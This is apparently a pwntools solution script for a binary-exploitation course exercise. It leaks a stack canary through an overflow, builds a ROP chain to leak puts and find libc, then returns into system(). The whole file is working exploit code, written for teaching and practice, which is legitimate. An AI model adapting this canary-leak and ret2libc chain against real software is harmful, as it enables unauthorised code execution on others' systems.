#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise4/exercise4b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
if args.GDB:
    print("GDB", r.recvline())
# welcome
print(r.recvline())
r.sendline("cat flag")
print(r.recvline())
# check_authorization
print(r.recvline())
print(r.recvline())
r.sendline(b"A"* (4*4*13+7))
print(r.recvline())
print(r.recvline())
can = r.recvline()[:4]
padding_can = (b"A"* (4*4*13+8)) + can + (b"A" * 12)

file = ELF(exe)
rop = ROP(file)

r.recvline()
r.recvline()
r.sendline(padding_can + p64((rop.find_gadget(["pop rdi", "ret"]))[0]) + p64(file.got["puts"]) + p64(file.plt["puts"]) + p64(file.symbols["check_authorization"]))
r.recvline()

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.address = int.from_bytes(r.recvline()[:-1], "little") - libc.symbols["puts"]

r.recvline()
r.sendline(padding_can + p64((rop.find_gadget(["ret"]))[0]) + p64(libc.sym["system"]) + p64(file.symbols["check_authorization"]))

print(r.recvall(10))
print(r.recvall())

